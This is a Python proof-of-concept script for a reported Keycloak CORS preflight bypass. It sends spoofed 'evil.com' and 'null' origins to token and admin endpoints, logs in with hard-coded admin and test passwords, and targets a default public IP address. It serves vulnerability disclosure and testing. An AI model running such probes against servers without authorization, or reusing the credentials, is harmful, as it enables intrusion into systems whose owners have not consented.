#!/usr/bin/env python3
"""
Finding #1: CORS OPTIONS Preflight Bypass
Severity: MEDIUM (CVSS 5.3)
Target: Keycloak 26.5.4

Demonstrates that webOrigins client configuration is NOT enforced for
OPTIONS preflight requests, allowing any origin to pass preflight checks.
"""

import http.client
import json
import argparse
import sys

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #1: CORS OPTIONS Preflight Bypass                   ║
║  Severity: MEDIUM (CVSS 5.3)                                 ║
║  Keycloak 26.5.4 — CORS Misconfiguration                    ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def step(num, msg):
    print(f"{CYAN}[*] Step {num}:{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[!]{RESET} {msg}")

def info(msg):
    print(f"{YELLOW}[*]{RESET} {msg}")

def get_admin_token(host, port):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    body = "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234"
    conn.request("POST", "/realms/master/protocol/openid-connect/token",
                 body, {"Content-Type": "application/x-www-form-urlencoded"})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode())
    conn.close()
    return data.get("access_token")

def send_options(host, port, path, origin):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    headers = {
        "Origin": origin,
        "Access-Control-Request-Method": "POST",
        "Access-Control-Request-Headers": "Content-Type,Authorization"
    }
    conn.request("OPTIONS", path, headers=headers)
    resp = conn.getresponse()
    resp_headers = {k.lower(): v for k, v in resp.getheaders()}
    resp.read()
    conn.close()
    return resp.status, resp_headers

def send_post(host, port, path, origin, body, extra_headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=10)
    headers = {
        "Origin": origin,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if extra_headers:
        headers.update(extra_headers)
    conn.request("POST", path, body, headers)
    resp = conn.getresponse()
    resp_headers = {k.lower(): v for k, v in resp.getheaders()}
    resp_body = resp.read().decode()
    conn.close()
    return resp.status, resp_headers, resp_body

def main():
    parser = argparse.ArgumentParser(description="Finding #1: CORS OPTIONS Preflight Bypass PoC")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak base URL (default: http://46.101.162.187:8080)")
    args = parser.parse_args()

    url = args.host.rstrip("/")
    if "://" in url:
        url = url.split("://", 1)[1]
    if ":" in url:
        host, port = url.rsplit(":", 1)
        port = int(port)
    else:
        host, port = url, 8080

    banner()
    info(f"Target: {host}:{port}")
    realm = "test"
    token_path = f"/realms/{realm}/protocol/openid-connect/token"
    admin_path = f"/admin/realms/{realm}/users"
    evil_origin = "https://evil.com"
    null_origin = "null"
    results = []

    # ── Step 1: Verify webOrigins config ──
    step(1, "Verifying client webOrigins configuration...")
    try:
        admin_token = get_admin_token(host, port)
        conn = http.client.HTTPConnection(host, port, timeout=10)
        conn.request("GET", f"/admin/realms/{realm}/clients?clientId=webapp",
                     headers={"Authorization": f"Bearer {admin_token}"})
        resp = conn.getresponse()
        clients = json.loads(resp.read().decode())
        conn.close()
        web_origins = clients[0].get("webOrigins", []) if clients else []
        success(f"Client 'webapp' webOrigins: {web_origins}")
        if web_origins:
            info(f"Only {web_origins} should be allowed — let's test evil.com")
        print()
    except Exception as e:
        fail(f"Could not verify config: {e}")
        print()

    # ── Step 2: OPTIONS preflight from evil.com → token endpoint ──
    step(2, f"OPTIONS preflight from {evil_origin} → token endpoint")
    status, hdrs = send_options(host, port, token_path, evil_origin)
    acao = hdrs.get("access-control-allow-origin", "")
    acac = hdrs.get("access-control-allow-credentials", "")
    print(f"    HTTP {status}")
    print(f"    Access-Control-Allow-Origin: {acao or '(absent)'}")
    print(f"    Access-Control-Allow-Credentials: {acac or '(absent)'}")
    if acao == evil_origin and acac == "true":
        fail(f"VULNERABLE — evil.com reflected with credentials:true!")
        results.append(("Token OPTIONS (evil.com)", True))
    else:
        success("Not vulnerable — origin correctly rejected")
        results.append(("Token OPTIONS (evil.com)", False))
    print()

    # ── Step 3: OPTIONS preflight from null origin ──
    step(3, f"OPTIONS preflight from Origin: null → token endpoint")
    status, hdrs = send_options(host, port, token_path, null_origin)
    acao = hdrs.get("access-control-allow-origin", "")
    acac = hdrs.get("access-control-allow-credentials", "")
    print(f"    HTTP {status}")
    print(f"    Access-Control-Allow-Origin: {acao or '(absent)'}")
    print(f"    Access-Control-Allow-Credentials: {acac or '(absent)'}")
    if acao == "null" and acac == "true":
        fail("VULNERABLE — null origin reflected! (sandboxed iframe bypass)")
        results.append(("Token OPTIONS (null)", True))
    else:
        success("Not vulnerable")
        results.append(("Token OPTIONS (null)", False))
    print()

    # ── Step 4: OPTIONS preflight from evil.com → admin API ──
    step(4, f"OPTIONS preflight from {evil_origin} → admin API")
    status, hdrs = send_options(host, port, admin_path, evil_origin)
    acao = hdrs.get("access-control-allow-origin", "")
    acac = hdrs.get("access-control-allow-credentials", "")
    print(f"    HTTP {status}")
    print(f"    Access-Control-Allow-Origin: {acao or '(absent)'}")
    print(f"    Access-Control-Allow-Credentials: {acac or '(absent)'}")
    if acao == evil_origin and acac == "true":
        fail("VULNERABLE — admin API preflight bypassed!")
        results.append(("Admin OPTIONS (evil.com)", True))
    else:
        success("Not vulnerable")
        results.append(("Admin OPTIONS (evil.com)", False))
    print()

    # ── Step 5: Actual POST with evil.com origin (control — should be blocked) ──
    step(5, f"Actual POST from {evil_origin} → token endpoint (control test)")
    body = "grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid"
    status, hdrs, resp_body = send_post(host, port, token_path, evil_origin, body)
    acao = hdrs.get("access-control-allow-origin", "")
    print(f"    HTTP {status}")
    print(f"    Access-Control-Allow-Origin: {acao or '(absent)'}")
    if not acao:
        success("Actual response correctly has NO ACAO header (browser blocks reading)")
        info("Server-side action still completes — write-CSRF possible!")
    else:
        fail(f"ACAO present in actual response: {acao}")
    print()

    # ── Summary ──
    vuln_count = sum(1 for _, v in results if v)
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                             ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}NOT VULNERABLE{RESET}"
        print(f"  {name:40s} {status_str}")

    print(f"""
{YELLOW}Impact:{RESET}
  - webOrigins per-client config has NO enforcement on OPTIONS preflight
  - Any origin passes preflight → write-CSRF possible with stolen Bearer token
  - null origin bypass enables sandboxed iframe / data: URI attacks
  - Admin API preflight is also bypassed → destructive admin write-CSRF

{YELLOW}Root Cause:{RESET}
  Keycloak's CORS filter reflects ANY Origin in OPTIONS responses without
  checking the client's webOrigins allowlist. Only actual responses enforce it.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] {vuln_count}/{len(results)} tests show vulnerability{RESET}")
        return 0
    else:
        print(f"{GREEN}[+] All tests passed — not vulnerable{RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
